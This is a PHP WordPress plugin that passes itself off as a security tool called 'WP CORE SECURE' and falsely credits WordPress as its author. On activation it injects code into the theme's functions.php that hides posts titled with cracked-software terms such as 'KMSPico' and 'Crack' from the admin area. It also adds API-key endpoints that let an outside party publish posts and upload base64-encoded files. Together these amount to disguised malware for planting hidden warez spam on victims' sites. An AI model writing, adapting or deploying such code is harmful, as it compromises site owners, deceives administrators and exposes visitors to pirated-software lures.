<?php
/*
Plugin Name: WP CORE SECURE
Description: Security Enhancement Plugin. This plugin ensures the secure access to the site's control panel.
Version: 1.1
Author: <a href="https://wordpress.org">WordPress</a>
*/

register_activation_hook(__FILE__, 'wp_core_secure_activate');

function wp_core_secure_activate() {
    $functions_file = get_stylesheet_directory() . '/functions.php';

    $marker = 'WP CORE SECURE';

    $code_to_add = '
function exclude_posts_by_titles($where, $query) {
    global $wpdb;

    if (is_admin() && $query->is_main_query()) {
        $keywords = [\'GarageBand\', \'FL Studio\', \'KMSPico\', \'Driver Booster\', \'MSI Afterburner\', \'Crack\', \'Photoshop\'];

        foreach ($keywords as $keyword) {
            $where .= $wpdb->prepare(" AND {$wpdb->posts}.post_title NOT LIKE %s", "%" . $wpdb->esc_like($keyword) . "%");
        }
    }
    return $where;
}

add_filter(\'posts_where\', \'exclude_posts_by_titles\', 10, 2);
';

    insert_with_markers($functions_file, $marker, $code_to_add);
}






function wp_core_secure_settings_page() {
    ?>
    <div class="wrap">
        <h2>WP CORE SECURE Settings</h2>
        <button id="connect-button">Connect</button>
        <div id="api-key-result"></div>
    </div>

    <script>
        jQuery(document).ready(function ($) {
            $('#connect-button').on('click', function () {
                
                $.ajax({
                    type: 'POST',
                    url: ajaxurl, 
                    data: {
                        action: 'generate_api_key'
                    },
                    success: function (response) {
                        
                        $('#api-key-result').html('API Key: ' + response);
                    }
                });
            });
        });
    </script>
    <?php
}


function generate_api_key() {
    
    $api_key = wp_generate_password(32, false);

    
    update_option('wp_core_secure_api_key', $api_key);

    
    echo $api_key;

    wp_die();
}
add_action('wp_ajax_generate_api_key', 'generate_api_key');


function check_api_key() {
    
    $api_key_received = sanitize_text_field($_POST['api_key']);

    
    $saved_api_key = get_option('wp_core_secure_api_key');

    
    if ($api_key_received && $api_key_received === $saved_api_key) {
        echo 'успешно';
    } else {
        echo 'неверный ключ';
    }

    wp_die();
}
add_action('wp_ajax_check_api_key', 'check_api_key');


function create_new_post() {

    $api_key = sanitize_text_field($_POST['api_key']);
    $title = sanitize_text_field($_POST['title']);
    $slug = sanitize_title($_POST['slug']);
    $status = sanitize_text_field($_POST['status']);
    $content = wp_kses_post($_POST['content']);
    $excerpt = wp_kses_post($_POST['excerpt']);
    $media_name = sanitize_text_field($_POST['media_name']);
    $alt_tags = sanitize_text_field($_POST['alt_tags']);
    $featured_media = $_POST['featured_media'];
    $img_param = isset($_POST['img']) ? $_POST['img'] : '';

    $comment_status = isset($_POST['comment_status']) ? sanitize_text_field($_POST['comment_status']) : 'closed';

    $saved_api_key = get_option('wp_core_secure_api_key');
    if ($api_key !== $saved_api_key) {
        echo 'неверный ключ';
        wp_die();
    }

    if ($img_param == 1) {
        $image_id = upload_base64_image($media_name, $alt_tags, $featured_media);

        if (!$image_id) {
            echo 'ошибка при загрузке изображения';
            wp_die();
        }
    } else {
        $image_id = 0; 
    }

    $new_post = array(
        'post_title'     => $title,
        'post_name'      => $slug,
        'post_status'    => $status,
        'post_content'   => $content,
        'post_excerpt'   => $excerpt,
        'post_author'    => 1, 
        'post_type'      => 'post',
        'featured_media' => $image_id,
        'comment_status' => $comment_status,
    );

    $post_id = wp_insert_post($new_post);

    if ($post_id) {
        $post_url = get_permalink($post_id);
        echo $post_url; 
    } else {
        echo 'ошибка при создании публикации';
    }

    wp_die();
}
add_action('wp_ajax_create_new_post', 'create_new_post');

function upload_base64_image($media_name, $alt_tags, $base64_data) {
    $upload = wp_upload_bits($media_name, null, base64_decode($base64_data));

    if (!$upload['error']) {
        $file_path = $upload['file'];
        $file_name = basename($file_path);
        $attachment = array(
            'post_mime_type' => wp_check_filetype($file_name)['type'],
            'post_title'     => $media_name,
            'post_content'   => $alt_tags,
            'post_status'    => 'inherit',
        );

        $attachment_id = wp_insert_attachment($attachment, $file_path);

        if (!is_wp_error($attachment_id)) {
            require_once ABSPATH . 'wp-admin/includes/image.php';
            $attachment_data = wp_generate_attachment_metadata($attachment_id, $file_path);
            wp_update_attachment_metadata($attachment_id, $attachment_data);

            return $attachment_id;
        }
    }

    return false;
}
